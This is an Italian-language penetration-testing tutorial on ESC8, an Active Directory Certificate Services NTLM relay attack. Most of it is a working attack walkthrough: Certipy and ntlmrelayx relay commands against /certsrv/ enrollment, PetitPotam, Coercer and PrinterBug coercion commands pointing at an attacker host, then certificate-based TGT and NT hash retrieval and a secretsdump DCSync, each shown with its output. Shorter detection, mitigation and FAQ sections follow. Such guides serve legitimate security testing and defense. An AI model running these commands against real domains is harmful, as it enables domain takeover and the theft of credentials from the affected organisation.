---
title: 'ESC8 ADCS: NTLM Relay contro Web Enrollment per Domain Admin'
slug: esc8-adcs
description: 'ESC8 privilege escalation, sfrutta NTLM Relay contro gli endpoint /certsrv/ di AD CS per ottenere certificati privilegiati. Guida pratica con Certipy e coercion NTLM.'
image: /8.webp
draft: false
date: 2026-03-08T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - esc8-privesc
  - adcs
  - certipy
  - ad-esc
---

ESC8 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che sfrutta **NTLM Relay contro gli endpoint HTTP di enrollment della Certificate Authority**. In pratica l'attaccante intercetta un'autenticazione NTLM di un account privilegiato e la inoltra al servizio web di AD CS per ottenere un certificato a nome della vittima.

I target principali sono gli endpoint web di enrollment:

* `http://<CA>/certsrv/`
* `https://<CA>/certsrv/`
* CES (Certificate Enrollment Service)
* CEP (Certificate Enrollment Policy)

⚠️ **Certipy supporta il relay solo verso il classico Web Enrollment `/certsrv/`**, in particolare l'endpoint:

```
/certsrv/certfnsh.asp
```

Il problema nasce quando questi servizi:

* accettano **NTLM authentication**
* **non usano Extended Protection for Authentication (EPA)**
* oppure permettono **HTTP senza TLS**

In queste condizioni è possibile effettuare **NTLM relay** verso la CA e ottenere certificati privilegiati.

Questo tipo di attacco è spesso combinato con tecniche di coercion come:

* PetitPotam
* PrinterBug
* Coercer

(vedi anche le tecniche di coercion nella guida **Active Directory Pentesting** su HackIta).

***

# Identificazione con Certipy

Certipy può rilevare configurazioni vulnerabili ESC8 analizzando i servizi web della CA.

```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
```

Output tipico:

```
Certificate Authorities

CA Name : CORP-CA
DNS Name : CA.CORP.LOCAL

Web Enrollment
  HTTP
    Enabled : False
  HTTPS
    Enabled : True
    Channel Binding (EPA) : False

[!] Vulnerabilities
  ESC8 : Web Enrollment is enabled over HTTPS and Channel Binding is disabled
```

Indicatori principali:

* `HTTP Enabled : True`
* oppure `HTTPS Enabled : True` ma `Channel Binding (EPA) : False`
* `[!] Vulnerabilities ESC8`

***

# Exploit ESC8 ADCS

L'attacco richiede **due terminali aperti in parallelo**. Il relay deve essere in ascolto **prima** di triggerare la coercion.

***

## Metodo 1 — Certipy relay + PetitPotam

### Terminale 1 — Avvia NTLM relay con Certipy

Se si vuole impersonare un **Domain Controller**:

```bash
certipy relay -target 'http://10.0.0.50' -template 'DomainController'
```

Se si vuole relayare un **utente**:

```bash
certipy relay -target 'http://10.0.0.50'
```

Output:

```
Targeting http://10.0.0.50/certsrv/certfnsh.asp (ESC8)
Listening on 0.0.0.0:445
Setting up SMB Server on port 445
```

Se compare errore porta 445 su Linux:

```bash
echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start
```

### Terminale 2 — Coercion autenticata con PetitPotam

La versione unauthenticated di PetitPotam è stata patchata — serve almeno un account di dominio a basso privilegio per triggerare la coercion:

```bash
python3 PetitPotam.py \
  -d corp.local \
  -u 'hope.sharp' \
  -p 'IsolationIsKey?' \
  <ATTACKER_IP> \
  <DC_IP>
```

Output atteso:

```
[+] Connected!
[+] Successfully bound!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Output relay riuscito su Certipy:

```
Requesting certificate for 'CORP\\DC$' based on the template 'DomainController'
Certificate issued with request ID 1
Got certificate with DNS Host Name 'DC.CORP.LOCAL'
Saving certificate and private key to 'dc.pfx'
```

***

## Metodo 2 — ntlmrelayx + PetitPotam

### Terminale 1 — Avvia il relay con ntlmrelayx

```bash
ntlmrelayx.py \
  -t http://10.0.0.50/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
```

Per relayare un utente:

```bash
ntlmrelayx.py \
  -t http://10.0.0.50/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template User
```

### Terminale 2 — Coercion con PetitPotam o Coercer

Con PetitPotam autenticato:

```bash
python3 PetitPotam.py -d corp.local -u 'user' -p 'password' <ATTACKER_IP> <DC_IP>
```

Con Coercer (aggrega decine di metodi di coercion):

```bash
coercer coerce \
  -l <ATTACKER_IP> \
  -t <DC_IP> \
  -d corp.local \
  -u 'user' \
  -p 'password' \
  --always-continue
```

Con PrinterBug:

```bash
python3 printerbug.py corp.local/'user':'password'@<DC_IP> <ATTACKER_IP>
```

***

## Step 3 — Autenticazione con il certificato

### Con Certipy

```bash
certipy auth -pfx 'dc.pfx' -dc-ip '10.0.0.100'
```

Output:

```
Got TGT
Saving credential cache to 'dc.ccache'
Got hash for 'dc$@corp.local'
```

### Con PKINITtools (da base64 ntlmrelayx)

ntlmrelayx restituisce il certificato in base64. Convertiamo e usiamo PKINITtools:

```bash
echo -n "<BASE64_CERT>" | base64 -d > dc.pfx

python3 gettgtpkinit.py \
  -dc-ip 10.0.0.100 \
  -cert-pfx dc.pfx \
  corp.local/dc$ dc.ccache

export KRB5CCNAME=dc.ccache

python3 getnthash.py corp.local/dc$ -key <AS_REP_KEY>
```

Con l'NT hash del DC si procede con DCSync:

```bash
secretsdump.py -hashes :<NT_HASH> 'corp.local/dc$@<DC_IP>'
```

Risultato finale:

* **Kerberos TGT**
* **NT hash**
* **Domain compromise**

***

# Detection ESC8 ADCS

* **Event ID 4886** — Richiesta certificato ricevuta dalla CA
* **Event ID 4887** — Certificato emesso (controllare il campo *Requester*)
* Accessi sospetti a `/certsrv/certfnsh.asp` da IP non autorizzati
* Autenticazioni NTLM verso host non previsti in rete
* Richieste certificate anomale fuori orario o da account machine insoliti

***

# Mitigation ESC8 ADCS

**1️⃣ Abilitare Extended Protection for Authentication (EPA)**
sui servizi IIS di AD CS.

**2️⃣ Usare solo HTTPS**
e disabilitare HTTP.

**3️⃣ Disabilitare NTLM sui servizi web**
quando possibile.

**4️⃣ Disabilitare Web Enrollment se non necessario**

***

# FAQ — ESC8 ADCS

### Cos'è ESC8 in AD CS?

È un attacco di **NTLM relay contro i servizi web di enrollment della CA**.

### ESC8 permette Domain Admin?

Sì. Se viene relayato un account privilegiato come **Domain Controller** o **Administrator**, l'attaccante può ottenere il relativo certificato e da lì il TGT + NT hash.

### ESC8 richiede un account di dominio?

Sì — la versione unauthenticated di PetitPotam (CVE-2021-36942) è stata patchata. Serve almeno un account di dominio a basso privilegio per la coercion autenticata.

### Qual è la differenza tra ESC8 e ESC6?

[ESC6](https://hackita.it/articoli/esc6-adcs) sfrutta configurazioni della CA sui template.
ESC8 sfrutta **NTLM relay verso l'interfaccia web della CA**.

***

**Key Takeaway:** se `/certsrv/` accetta NTLM senza Extended Protection, un attaccante con un qualsiasi account di dominio può triggerare la coercion di un DC e ottenere un certificato privilegiato.

***

> ESC8 è uno degli attacchi più comuni contro AD CS.
> Per vedere tutte le tecniche certificate attack consulta la guida completa:
> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)\
> \
> Continua con le escalation successive:
> [https://hackita.it/articoli/esc9-adcs](https://hackita.it/articoli/esc9-adcs) · [https://hackita.it/articoli/esc10-adcs](https://hackita.it/articoli/esc10-adcs)\
>
> Riferimenti tecnici:
> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
> [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
